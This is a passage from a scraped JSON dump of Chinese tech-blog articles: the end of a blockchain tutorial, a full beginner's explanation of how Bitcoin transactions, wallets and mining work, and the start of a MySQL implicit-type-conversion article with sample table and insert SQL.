alt=\"\"></p>\n<p>由于新区块的生成速度由计算能力决定，所以这条规则就是说，拥有大多数计算能力的那条分支，就是正宗的比特链。</p>\n<h2>九、总结</h2>\n<p>区块链作为无人管理的分布式数据库，从2009年开始已经运行了8年，没有出现大的问题。这证明它是可行的。</p>\n<p>但是，为了保证数据的可靠性，区块链也有自己的代价。一是效率，数据写入区块链，最少要等待十分钟，所有节点都同步数据，则需要更多的时间；二是能耗，区块的生成需要矿工进行无数无意义的计算，这是非常耗费能源的。</p>\n<p>因此，区块链的适用场景，其实非常有限。</p>\n<blockquote>\n<ol start=\"1\">\n<li>不存在所有成员都信任的管理当局</li>\n<li>写入的数据不要求实时使用</li>\n<li>挖矿的收益能够弥补本身的成本</li>\n</ol>\n</blockquote>\n<p>如果无法满足上述的条件，那么传统的数据库是更好的解决方案。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/0f7857e7b2a1d2e4ba4799f4a85b6898.png\" alt=\"\"></p>\n<p>目前，区块链最大的应用场景（可能也是唯一的应用场景），就是以比特币为代表的加密货币。下一篇文章，我将会介绍<a href=\"http://blog.jobbole.com/113429/\" target=\"_blank\">比特币的入门知识</a>。</p>\n<h2>十、参考链接</h2>\n<ul>\n<li><a href=\"https://medium.freecodecamp.org/how-does-blockchain-really-work-i-built-an-app-to-show-you-6b70cd4caf7d\">How does blockchain really work?</a>, by Sean Han</li>\n<li><a href=\"http://www.righto.com/2014/02/bitcoin-mining-hard-way-algorithms.html\">Bitcoin mining the hard way: the algorithms, protocols, and bytes</a>, by Ken Shirriff</li>\n</ul>\n<p>（完）</p>\n<p><!-- /div --></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113428\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113428votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113428\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/6f8e539ebd60294ea83d44f2957418887cfa6a70.jpg"}
{"url_object_id": "8cde19a52cb038302a7b2e77c7e9fc88", "title": "比特币入门教程", "url": "http://blog.jobbole.com/113429/", "create_date": "2018/01/04", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/63509403a5b3f6d5f982aa86a1d386ef.jpg"], "praise_nums": 3, "comment_nums": 0, "favor_nums": 5, "tags": "IT技术,比特币", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html\">阮一峰</a>   </div><div id=\"main-content\"><!-- div class=\"asset-body\" -->比特币（bitcoin）诞生于2008年的一篇<a href=\"https://bitcoin.org/en/bitcoin-paper\">论文</a>。\n<p><!-- /div --> <!-- div id=\"more\" class=\"asset-more\" --></p>\n<p>一个署名为中本聪的人，提出了革命性的构想：让我们创造一种不受政府或其他任何人控制的货币！这个想法堪称疯狂：一串数字，背后没有任何资产支持，也没有任何人负责，你把它当作钱付给对方，怎么会有人愿意接受？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/63509403a5b3f6d5f982aa86a1d386ef.jpg\" alt=\"\"></p>\n<p>但是，狂想居然变成了现实。随后的几年，在全世界无数爱好者的支持下，比特币网络运行起来了，越来越多的人和资本参与，星星之火，终成燎原。刚刚过去的2017年，比特币迎来了爆发式的增长，从年初的1000美元，最高涨到了2万美元，全世界都为之震动，上到政府，下到普通百姓都在关注。事实就是比特币已经并将继续改变世界。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/27309973c9e7f2fbc7e80eb62494fc77.png\" alt=\"\"></p>\n<p>新闻媒体往往只关注它的火爆表现，忽视或者无法回答一些基本的问题。</p>\n<blockquote>\n<ul>\n<li>比特币的原理是什么？</li>\n<li>为什么这个无人管理的体系可以成功运作？</li>\n<li>比特币交易的流程是怎么回事？</li>\n<li>它与区块链又是什么关系？</li>\n</ul>\n</blockquote>\n<p>下面，我尝试回答这些问题，希望帮助大家理解比特币。抛开技术细节，还是很容易解释的。</p>\n<p>有一点说明，本文只讨论技术问题，不涉及如何投资比特币，更不会预测价格走势。事实上，我也不知道，如果我知道怎么发财，可能就不会在这里写博客了。</p>\n<h2>一、非对称加密</h2>\n<p>首先，理解比特币，必须理解<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">非对称加密</a>。</p>\n<p>你可能听说过这个词，所谓非对称加密，其实很简单，就是加密和解密需要两把钥匙：一把公钥和一把私钥。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f8fb5b5c73dd908f09a6ded5e0308b41.png\" alt=\"\"></p>\n<p>公钥是公开的，任何人都可以获取。私钥是保密的，只有拥有者才能使用。他人使用你的公钥加密信息，然后发送给你，你用私钥解密，取出信息。反过来，你也可以用私钥加密信息，别人用你的公钥解开，从而证明这个信息确实是你发出的，且未被篡改，这叫做数字签名（更详细的介绍请看<a href=\"http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html\">《什么是数字签名》</a>）。</p>\n<p>现在请设想，<strong>如果公钥加密的不是普通的信息，而是加密了一笔钱，发送给你，这会怎样？</strong></p>\n<p>首先，你能解开加密包，取出里面的钱，因为私钥在你手里。其次，别人偷不走这笔钱，因为他们没有你的私钥。因此，支付可以成功。</p>\n<p>这就是比特币（以及其他数字货币）的原理：非对称加密保证了支付的可靠性。</p>\n<p>由于支付的钱必须通过私钥取出，所以你是谁并不重要，重要的是谁拥有私钥。只有拥有了私钥，才能取出支付给你的钱。（事实上，真实的交易流程稍有不同，私钥保证的不是取出支付给你的钱，而是保证只有你能把这些属于你的钱支付出去，详见后文。）</p>\n<h2>二、比特币钱包</h2>\n<p>对于比特币来说，钱不是支付给个人的，而是支付给某一把私钥。这就是交易匿名性的根本原因，因为没有人知道，那些私钥背后的主人是谁。</p>\n<p>所以，<strong>比特币交易的第一件事，就是你必须拥有自己的公钥和私钥。</strong></p>\n<p>你去网上那些比特币交易所开户，它们会让你首先生成一个比特币钱包（wallet）。<strong>这个钱包不是用来存放比特币，而是存放你的公钥和私钥。</strong>软件会帮你生成这两把钥匙，然后放在钱包里面。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/4333573063fb5a3756b527b494563f5f.png\" alt=\"\"></p>\n<p>根据协议，公钥的长度是512位。这个长度不太方便传播，因此协议又规定，要为公钥生成一个160位的指纹。所谓指纹，就是一个比较短的、易于传播的哈希值。160位是二进制，写成十六进制，大约是26到35个字符，比如 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2。这个字符串就叫做钱包的地址，它是唯一的，即每个钱包的地址肯定都是不一样的。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/174928d2d1378ea027f6e05859ccf9fd.png\" alt=\"\"></p>\n<p>你向别人收钱时，只要告诉对方你的钱包地址即可，对方向这个地址付款。由于你是这个地址的拥有者，所以你会收到这笔钱。</p>\n<p>由于你是否拥有某个钱包地址，是由私钥证明的（具体的证明方法稍后介绍），所以一定要保护好私钥。这是极其重要的，如果你的私钥被偷了，你的比特币也就等于没了，因为他人可以冒用你的身份了，把钱包里面的钱都转走。</p>\n<p>同样的，你向他人支付比特币，千万不能写错他人的钱包地址，否则你的比特币就支付到了另一个不同的人了。</p>\n<h2>三、交易过程</h2>\n<p>下面，我把整个流程串起来，看看比特币如何完成一笔交易。</p>\n<p><strong>一笔交易就是一个地址的比特币，转移到另一个地址。</strong>由于比特币的交易记录全部都是公开的，哪个地址拥有多少比特币，都是可以查到的。因此，支付方是否拥有足够的比特币，完成这笔交易，这是可以轻易验证的。</p>\n<p>问题出在怎么防止其他人，冒用你的名义申报交易。举例来说，有人申报了一笔交易：地址 A 向地址 B 支付10个比特币。我怎么知道这个申报是真的，申报人就是地址 A 的主人？</p>\n<p>比特币协议规定，申报交易的时候，除了交易金额，转出比特币的一方还必须提供以下数据。</p>\n<blockquote>\n<ul>\n<li>上一笔交易的 Hash（你从哪里得到这些比特币）</li>\n<li>本次交易双方的地址</li>\n<li>支付方的公钥</li>\n<li>支付方的私钥生成的数字签名</li>\n</ul>\n</blockquote>\n<p>验证这笔交易是否属实，需要三步。</p>\n<blockquote><p>第一步，找到上一笔交易，确认支付方的比特币来源。</p>\n<p>第二步，算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。</p>\n<p>第三步，使用公钥去解开数字签名，保证私钥属实。</p></blockquote>\n<p>经过上面三步，就可以认定这笔交易是真实的。</p>\n<h2>四、交易确认与区块链</h2>\n<p>确认交易的真实性以后，交易还不算完成。<strong>交易数据必须写入数据库，才算成立，对方才能真正收到钱。</strong></p>\n<p>比特币使用的是一种特殊的数据库，叫做区块链（blockchain），详细的介绍请看<a href=\"http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html\">《区块链入门教程》</a>。本文只讨论交易如何写入区块链。</p>\n<p>首先，所有的交易数据都会传送到矿工那里。矿工负责把这些交易写入区块链。</p>\n<p>根据比特币协议，一个区块的大小最大是 1MB，而一笔交易大概是500字节左右，因此一个区块最多可以包含2000多笔交易。矿工负责把这2000多笔交易打包在一起，组成一个区块，然后计算这个区块的 Hash。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d2a41b71d213dcdc3e23259cec5181b0.jpg\" alt=\"\"></p>\n<p>计算 Hash 的过程叫做采矿，这需要大量的计算。矿工之间也在竞争，谁先算出 Hash，谁就能第一个添加新区块进入区块链，从而享受这个区块的全部收益，而其他矿工将一无所获。</p>\n<p>一笔交易一旦写入了区块链，就无法反悔了。这里需要建立一个观念：<strong>比特币不存放在钱包或其他别的地方，而是只存在于区块链上面。</strong>区块链记载了你参与的每一笔交易，你得到过多少比特币，你又支付了多少比特币，因此可以算出来你拥有多少资产。</p>\n<h2>五、矿工的收益</h2>\n<p>交易的确认离不开矿工。为什么有人愿意做矿工呢？</p>\n<p>比特币协议规定，挖到新区块的矿工将获得奖励，一开始（2008年）是50个比特币，然后每4年减半，目前（2018年）是12.5个比特币。这也是比特币的供给增加机制，流通中新增的比特币都是这样诞生的。</p>\n<p>你可能看出来了，每4年奖励减半，那么到了2140年，矿工将得不到任何奖励，比特币的数量也将停止增加。这时，矿工的收益就完全依靠交易手续费了。</p>\n<p>所谓交易手续费，就是矿工可以从每笔交易抽成，具体的金额由支付方自愿决定。你完全可以一毛不拔，一分钱也不给矿工，但是那样的话，你的交易就会没人处理，迟迟无法写入区块链，得到确认。矿工们总是优先处理手续费最高的交易。</p>\n<p>目前由于交易数量猛增，手续费已经水涨船高，一个区块2000多笔交易的手续费总额可以达到3～10个比特币。如果你的手续费给低了，很可能过了一个星期，交易还没确认。</p>\n<p>一个区块的奖励金12.5个比特币，再加上手续费，收益是相当可观的。按照目前的价格，可以达到100万～200万人民币。想想看，运气好的话，几分钟就能挖到一个区块，拿到这样一大笔钱，怪不得人们对挖矿趋之若鹜。</p>\n<h2>六、区块的扩容</h2>\n<p><a href=\"http://blog.jobbole.com/113428/\">《区块链入门教程》</a>说过，比特币协议规定，平均10分钟诞生一个区块。区块的大小只有 1MB，最多只能包含2000多笔交易。也就是说，比特币网络每10分钟，最多只能处理2000多笔交易，换算一下，就是处理速度为3～5笔/秒。</p>\n<p>全世界的比特币交易这么多，可是区块链每秒最多只能处理5笔，这已经成为制约比特币发展的一个瓶颈。</p>\n<p>很早就有人呼吁，改革比特币协议，提升处理速度。这件事在2017年8月有了一点眉目，当时区块链发生了一次分叉，诞生了一个新协议，称为 <a href=\"https://en.wikipedia.org/wiki/Bitcoin_Cash\">Bitcoin Cash</a>（简称 BCH）。这种新货币其他方面都与比特币一致，就是每个区块的大小从 1MB 增加到了 8MB，因此处理速度提升了8倍，手续费也低得多。该协议是对原有区块链的分叉，因此当时持有比特币的人，等于一人获赠了一份同样数量的 BCH。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/39c38fe0e181acf13e1c7aa9a0bbfda7.png\" alt=\"\"></p>\n<p>BCH 等于创造了一种新货币，还有人提议，原始比特币的区块大小提升到 2MB，这称为 <a href=\"https://en.wikipedia.org/wiki/SegWit2x\">SegWit2x</a> 。这个建议原定于2017年11月实施，但是最后一刻由于缺乏共识，就被取消了，目前还在讨论中。</p>\n<h2>七、点对点网络</h2>\n<p>比特币是一个全世界的开放网络，只要你有服务器，就能加入这个网络，成为一个节点。每个节点都包含了整个区块链（目前大概 100多 GB），并且节点之间时刻不停地在同步信息。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/a28ca9a094a80d2ae06a24523b4fc759.png\" alt=\"\"></p>\n<p>当你发生了一笔支付，你所在的节点就会把这笔交易告诉另一个节点，直至传遍整个网络。矿工从网上收集各种新发生的交易，将它们打包写入区块链。一旦写入成功， 矿工所在节点的区块链，就成为最新版本，其他节点都会来复制新增的区块，保证全网的区块链都是一致的。</p>\n<p>最后，你所在的节点也拿到了最新的区块链，从而得知你早先的那笔交易，已经写在里面了，至此交易确认成功。</p>\n<h2>八、还有一个问题</h2>\n<p>写到这里，我就介绍完了比特币的基本知识，希望你已经明白了比特币是怎么回事。但是还有一个根本的问题，我没有回答：比特币的本质到底是什么？</p>\n<p>说到底，比特币只是区块链的一条记录，是凭空生成的，为什么可以当钱用？举例来说，矿工获得12.5个比特币的奖励，其实就是区块链有一个记录：”xxx地址获得12.5个比特币”。正是这行记录，导致该矿工获得了大笔金钱。如果区块链突然增加了一条记录，记载你的地址获得了1000个比特币，你就真的会有1000个比特币。这到底是为什么？</p>\n<p>这篇文章已经够长了，这个问题就留到下次再谈，欢迎关注本系列的最后一篇文章《数字货币的本质》。</p>\n<h2>九、参考链接</h2>\n<ul>\n<li><a href=\"https://arstechnica.com/tech-policy/2017/12/how-bitcoin-works/\">How Bitcoin works</a> , by Timothy B. Lee</li>\n<li><a href=\"http://www.righto.com/2014/02/bitcoins-hard-way-using-raw-bitcoin.html\">Bitcoins the hard way: Using the raw Bitcoin protocol</a>, by Ken Shirriff</li>\n</ul>\n<p>（完）</p>\n<p><!-- /div --></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113429\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113429votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113429\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/ddae0a332762a0378654c76a5bf56c4122737863.jpg"}
{"url_object_id": "8044183d5be6bd3a67d777b3e5b0d219", "title": "谈谈 MySQL 隐式类型转换", "url": "http://blog.jobbole.com/113315/", "create_date": "2017/12/14", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/dea4002e77dd3ecd398568bf746ea46c.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,MySQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/u/1462914/blog/1572292\">andyqian</a>   </div><h4>前言</h4>\n<p>今天我们继续回到MySQL系列文章中,谈一谈MySQL中隐式类型转换。(其实我最早知道是在慢SQL优化中知道隐式类型转换概念的),在说隐式类型转换之前,首先我们通过一个实例来看看是怎么回事。</p>\n<h4>数据结构</h4>\n<p>本文中所有的操作,都是基于该数据结构(有兴趣的童鞋,可以实验):</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6350c944808350524256\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncreate table t_base_user(   \r\noid bigint(20) not null primary key auto_increment,  \r\nname varchar(30) null comment \"name\",  \r\nemail varchar(30) null comment \"email\",  \r\nage int null comment \"age\",  \r\ntelephone varchar(30) null comment \"telephone\",  \r\nstatus tinyint(4) null comment \"0 无效 1 有效\",  \r\ncreated_at datetime null default now() comment \"创建时间\",  \r\nupdated_at datetime null default now() comment \"修改时间\"  )\r\n\r\n### 新建索引alter table t_base_user add index idx_email(email);\r\nalter table t_base_user add index idx_name(name);\r\nalter table t_base_user add index idx_telephone(telephone);\r\n\r\n### 新增记录: \r\nINSERT INTO `andyqian`.`t_base_user` (`name`, `email`, `age`, `telephone`, `status`, `created_at`, `updated_at`) \r\nVALUES ('111111', 'andytohome@gmail.com', '111', '12345678901', '1', now(),now());</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6350c944808350524256-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6350c944808350524256-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-1\"><span class=\"crayon-e\">create </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-2\"><span class=\"crayon-e\">oid </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">primary </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">auto_increment</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-3\"><span class=\"crayon-e\">name </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"name\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-4\"><span class=\"crayon-e\">email </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"email\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-5\"><span class=\"crayon-e\">age </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"age\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-6\"><span class=\"crayon-e\">telephone </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"telephone\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-7\"><span class=\"crayon-e\">status </span><span class=\"crayon-e\">tinyint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"0 无效 1 有效\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-8\"><span class=\"crayon-e\">created_at </span><span class=\"crayon-e\">datetime </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">default</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"创建时间\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-9\"><span class=\"crayon-e\">updated_at </span><span class=\"crayon-e\">datetime </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">default</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">comment</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"修改时间\"</span><span class=\"crayon-h\"> </span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-11\"><span class=\"crayon-p\">### 新建索引alter table t_base_user add index idx_email(email);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-12\"><span class=\"crayon-e\">alter </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">index </span><span class=\"crayon-e\">idx_name</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-13\"><span class=\"crayon-e\">alter </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">t_base_user </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">index </span><span class=\"crayon-e\">idx_telephone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">telephone</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-15\"><span class=\"crayon-p\">### 新增记录: </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6350c944808350524256-16\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-i\">INTO</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">andyqian</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">t_base_user</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">email</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">age</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">telephone</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">status</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">created_at</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">updated_at</span><span class=\"crayon-sy\">`</span><span 